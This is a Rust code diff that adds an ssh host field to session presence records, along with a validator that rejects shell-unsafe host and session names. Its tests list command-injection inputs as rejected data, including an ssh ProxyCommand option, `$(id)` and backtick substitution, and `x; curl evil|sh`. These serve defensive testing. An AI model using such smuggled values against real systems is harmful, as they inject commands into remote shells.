@@ -13,10 +13,21 @@ use serde::{Deserialize, Serialize};
 /// ceiling, so an oversized name fails the equality check like any other
 /// unclean one).
 const MAX_SESSION_NAME_CHARS: usize = 128;
+/// Cap on `host`: an ssh destination (an alias or `user@host`).
+const MAX_HOST_CHARS: usize = 64;
 pub const MAX_TABS: usize = 64;
 pub const MAX_PANES_PER_TAB: usize = 16;
 pub const MAX_LABEL_CHARS: usize = 96;
 pub const MAX_TOKEN_CHARS: usize = 24;
+
+/// Whether `s` reaches a shell command line unquoted without changing it:
+/// non-empty, only ASCII alphanumerics, `._-` and `extra`, and no leading
+/// `-` (an option).
+pub(crate) fn shell_inert(s: &str, extra: &str) -> bool {
+    !s.is_empty()
+        && !s.starts_with('-')
+        && s.chars().all(|c| c.is_ascii_alphanumeric() || "._-".contains(c) || extra.contains(c))
+}
 
 /// Current file schema version, written as `v`.
 pub const PRESENCE_VERSION: u32 = 1;
@@ -79,11 +90,27 @@ pub struct Presence {
     pub updated_epoch_s: u64,
     #[serde(default)]
     pub tabs: Vec<PresenceTab>,
+    /// Set by a mirror that copies another machine's presence files here:
+    /// the ssh destination that reaches the session. Absent for local
+    /// sessions. A peer with a host is attached through `ssh`, never
+    /// `switch_session`, and its identity is [`Presence::label`].
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub host: Option<String>,
 }
 
 impl Presence {
     pub fn to_json(&self) -> String {
         serde_json::to_string(self).unwrap_or_default()
+    }
+
+    /// The peer's identity and heading: `host/session_name` for a mirrored
+    /// remote session, the bare name otherwise — so a remote `work` and a
+    /// local `work` are two peers, never one.
+    pub fn label(&self) -> String {
+        match &self.host {
+            Some(host) => format!("{host}/{}", self.session_name),
+            None => self.session_name.clone(),
+        }
     }
 
     /// Lenient: bad JSON, a missing/empty name, or any string that doesn't
@@ -100,8 +127,13 @@ impl Presence {
             tab.panes.truncate(MAX_PANES_PER_TAB);
         }
         let clean = |s: &str, max: usize| s == crate::payload::sanitize(s, max);
+        // A hosted peer's host and name reach a remote shell: ssh joins the
+        // words after the destination into one command line.
         let ok = !p.session_name.is_empty()
             && clean(&p.session_name, MAX_SESSION_NAME_CHARS)
+            && p.host
+                .as_deref()
+                .is_none_or(|h| h.len() <= MAX_HOST_CHARS && shell_inert(h, "@:") && shell_inert(&p.session_name, ""))
             && p.tabs.iter().all(|tab| {
                 clean(&tab.name, MAX_LABEL_CHARS)
                     && tab.panes.iter().all(|pane| {
@@ -218,5 +250,29 @@ mod tests {
         let long = "x".repeat(10_000);
         let json = format!(r#"{{"session_name":"{long}","running":0,"attention":0}}"#);
         assert_eq!(Presence::parse(&json), None);
+    }
+
+    #[test]
+    fn host_round_trips_labels_and_is_validated() {
+        let local = Presence { session_name: "work".into(), ..Default::default() };
+        assert_eq!(local.label(), "work");
+        assert!(!local.to_json().contains("host"), "an absent host is never written");
+        let remote = Presence { session_name: "work".into(), host: Some("vps".into()), ..Default::default() };
+        assert_eq!(remote.label(), "vps/work");
+        assert_eq!(Presence::parse(&remote.to_json()), Some(remote));
+        let long = format!(r#""{}""#, "h".repeat(65));
+        for bad in [r#""""#, r#""\u001b[31mx""#, long.as_str(), r#""-oProxyCommand=x""#, r#""a b""#, r#""h;id""#] {
+            let json = format!(r#"{{"session_name":"work","running":0,"attention":0,"host":{bad}}}"#);
+            assert_eq!(Presence::parse(&json), None, "host {bad} must be rejected");
+        }
+        let ok = r#"{"session_name":"my-work_2.0","running":0,"attention":0,"host":"me@10.0.0.5:22"}"#;
+        assert!(Presence::parse(ok).is_some(), "user@ip:port and a dotted name are inert");
+        // ssh hands `zellij attach <name>` to the remote shell as one line.
+        for bad in ["x; curl evil|sh", "a b", "$(id)", "`id`", "-h", "it's"] {
+            let hosted = Presence { session_name: bad.into(), host: Some("vps".into()), ..Default::default() };
+            assert_eq!(Presence::parse(&hosted.to_json()), None, "hosted name {bad:?} must be rejected");
+            let local = Presence { session_name: bad.into(), ..Default::default() };
+            assert!(Presence::parse(&local.to_json()).is_some(), "a local name {bad:?} keeps today's rules");
+        }
     }
 }
